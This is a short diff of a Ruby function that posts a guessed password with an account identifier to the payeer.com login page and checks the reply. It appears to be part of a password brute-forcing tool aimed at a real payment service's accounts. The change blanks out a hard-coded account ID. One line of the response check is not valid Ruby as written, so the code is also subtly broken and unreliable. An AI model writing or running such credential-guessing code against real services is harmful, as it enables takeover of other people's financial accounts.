@@ -3,7 +3,7 @@ require "uri"
 
 def is_password_wrong?(password)
   uri = URI.parse "https://payeer.com/ru/auth/?backurl=%2Fru%2Faccount%2F"
-  response = (Net::HTTP.post_form uri, :email => "P1041910059", :password => password).body
+  response = (Net::HTTP.post_form uri, :email => "", :password => password).body
   response.include?  value="1"
 end
 
